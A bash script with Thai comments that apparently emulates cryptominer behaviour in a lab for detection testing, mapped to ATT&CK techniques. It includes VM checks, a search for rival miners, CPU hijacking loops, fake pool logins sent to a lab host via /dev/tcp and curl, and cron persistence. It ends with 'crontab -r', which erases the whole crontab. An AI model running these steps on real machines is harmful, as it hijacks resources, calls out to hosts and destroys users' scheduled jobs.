#!/usr/bin/env bash
# miner.sh - จำลองพฤติกรรม cryptominer
#
# ATT&CK:
#   T1496     1        Resource Hijacking (Simulate CPU Load with Yes)
#   T1057     1        Process Discovery (หา miner คู่แข่ง)
#   T1053.003 1,2      Cron persistence
#   T1082     4,5      VM check (miner จริงเช็คว่าอยู่ใน sandbox ไหม)
#   T1562.001          ไม่มี Linux test -> ตัดออก
#
# ไม่ได้ขุดจริง - โหลด CPU + เชื่อม pool จำลอง (c2_server.py พอร์ต 3333)
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
banner "miner"
setup_sandbox

POOL_HOST="${POOL_HOST:-192.168.56.1}"
POOL_PORT="${POOL_PORT:-3333}"
MINE="$SANDBOX/miner"
mkdir -p "$MINE"

# --- Stage 1: เช็คว่าอยู่ใน VM/sandbox ไหม (พฤติกรรมเด่นของ miner) ---
atomic T1082 4,5

# --- Stage 2: สำรวจทรัพยากร ---
echo "[miner] ตรวจสเปกเครื่อง"
nproc              > "$MINE/cpu_count.txt"
cat /proc/cpuinfo  > "$MINE/cpuinfo.txt"
free -m            > "$MINE/memory.txt"
lscpu 2>/dev/null  > "$MINE/lscpu.txt"
cat /proc/meminfo  > "$MINE/meminfo.txt"

# --- Stage 3: หา process คู่แข่ง ---
atomic T1057 1
ps aux > "$MINE/processes.txt"
ps aux | grep -iE 'xmrig|minerd|cpuminer|kdevtmpfsi' | grep -v grep \
       > "$MINE/competitors.txt" || true
top -bn1 | head -20 > "$MINE/top.txt" 2>/dev/null || true

# --- Stage 4: resource hijacking ---
atomic T1496 1

# --- Stage 5: โหลด CPU จริง 60 วินาที ---
echo "[miner] เริ่มโหลด CPU"
for i in 1 2; do
    timeout 60 bash -c 'while :; do echo "scale=2000; a(1)*4" | bc -l > /dev/null; done' &
done

# --- Stage 6: เชื่อม mining pool จำลอง ---
for i in $(seq 1 18); do
    timeout 2 bash -c "echo '{\"method\":\"login\",\"worker\":\"lab$i\"}' > /dev/tcp/$POOL_HOST/$POOL_PORT" 2>/dev/null || true
    curl -s -m 2 "http://$POOL_HOST:8080/submit?share=$i" -o /dev/null 2>/dev/null || true
    sleep 3
done

# --- Stage 7: persistence ผ่าน cron ---
atomic T1053.003 1,2

wait
crontab -r 2>/dev/null || true
done_banner "miner"